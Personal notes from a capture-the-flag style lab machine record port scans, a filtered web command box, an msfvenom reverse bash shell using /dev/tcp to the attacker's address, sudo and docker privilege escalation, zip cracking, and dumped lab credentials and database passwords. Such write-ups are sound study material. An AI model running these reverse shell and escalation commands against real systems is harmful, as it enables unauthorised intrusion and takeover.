source-code <!--made by vipul mirajkar thevipulm.appspot.com-->
	<script src="js/all.js"></script> # dir maby


paths:


ports:
	21/tcp open  ftp     vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))


users:
	Anurodh
	Apaar


test:
*   /contact
*   /images               (Status: 301) [Size: 315] [--> http://10.10.138.150/images/]
	/css                  (Status: 301) [Size: 312] [--> http://10.10.138.150/css/]
	/js                   (Status: 301) [Size: 311] [--> http://10.10.138.150/js/]
	/fonts                (Status: 301) [Size: 314] [--> http://10.10.138.150/fonts/]
*   /secret               (Status: 301) [Size: 315] [--> http://10.10.138.150/secret/]
		has text field [command] with button [execute] ok seems like hacker honeypot, they kno
		<input id="comm" type="text" name="command" placeholder="Command"> # id field seem peculiar mby find user or try admin
		will try /..././.../ to evade filtering on /secret,
		bypassing filter ezpez ls can be obfuscated like llss
	User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
	response has 38 words if hack page shows up and -fs size 566 for nothing on guy page
	how to run helpline.sh /home/apaar/.helpline.sh

*   try ftp anon login, gather info. -> anonymous:anonymous	creds, note.txt seems thats only thing in ftp:
	Anurodh told me that there is some filtering on strings being put in the command -- Apaar


What i learned:
great effort with creative ideas on attempts to upload reverse shell via command field.
Ideally next time find payloadsallthethings and enumerate the machine automatically for reverse shell utilizing commands on UNIX.
Additionally failed to realize one important thing regarding command field, after enumerating with what commands will work and not trigger defense and looking at the output.
What reamined after filtering out by size and words to discard commands that tirgger defense or show no output, some commands have a patter on pwd;ls where this format bypasses
the defese.
Using that formmat would allow you to enumerate further.
i thinks it was a nice try to utilize base64 to run commands that aren't allowed, attempt to achieve a shell via echo into the one shell file that exits in home dir and also wget method.

Okay trying again:
Since I have rce sorta via that command box, generating payload via msf venom might yield a revsh.

msfvenom -p cmd/unix/reverse_bash lhost=10.9.163.154 lport=4444 -f raw > shell.sh
bash -c '0<&20-;exec 20<>/dev/tcp/10.9.163.154/4444;sh <&20 >&20 2>&20'

Okay payload generated now just need to run listener, and run something like pwd;$payload and life is good.
it works, got a smol shell

cat /etc/passwd | grep '/bash'

root:x:0:0:root:/root:/bin/bash
aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash
apaar:x:1001:1001:,,,:/home/apaar:/bin/bash
anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash

www-data@ubuntu:/var/www/files$ cat index.php
cat index.php
<html>
<body>
<?php
        if(isset($_POST['submit']))
        {
                $username = $_POST['username'];
                $password = $_POST['password'];
                ob_start();
                session_start();
                try
                {
                        $con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
                        $con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
                }
                catch(PDOException $e)
                {
                        exit("Connection failed ". $e->getMessage());
                }
                require_once("account.php");
                $account = new Account($con);
                $success = $account->login($username,$password);
                if($success)
                {
                        header("Location: hacker.php");
                }
www-data@ubuntu:/var/www/files$ cat account.php
cat account.php
<?php

class Account
{
        public function __construct($con)
        {
                $this->con = $con;
        }
        public function login($un,$pw)
        {
                $pw = hash("md5",$pw);
                $query = $this->con->prepare("SELECT * FROM users WHERE username='$un' AND password='$pw'");
                $query->execute();
                if($query->rowCount() >= 1)
                {
                        return true;
                }?>
                <h1 style="color:red";>Invalid username or password</h1>

www-data@ubuntu:/home/apaar$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
www-data@ubuntu:/home/apaar$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh
sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: 

Hello user! I am ,  Please enter your message: id
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
Thank you for your precious time!
www-data@ubuntu:/home/apaar$ 

The privilege escalation method:

What I learned: for the love of god interpret the sudo -l output properly.
	Turns out you can run commands as other users which I assumed in bold that I will need the users password because security duh lol.

Interesting one line bash script if you can run scripts with root, to simulate a root shell.
bash "#\!/bin/bash\n\"run=true; while \$run; do; read -p \"root~$ \" r; [ \"$r\" == \"exit\" ] && run=false; $r; done\""

ended up using non-one-line version of the bash root emulator.
got it on the target using the existing shell script and wget.
interestingly su root on my sys using my script works and bypasses the password but on target machine i get nothing >:C

Do more steganography.
Cracking zip archives via zip2john archi.zip > archi.john --> john --wordlist=/usr/share... archi.john


Anurodh:IWQwbnRLbjB3bVlwQHNzdzByZA==
Anurdoh:!d0ntKn0wmYp@ssw0rd
ssh login

id command shows some docker privs we could use to gtfobins on
./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
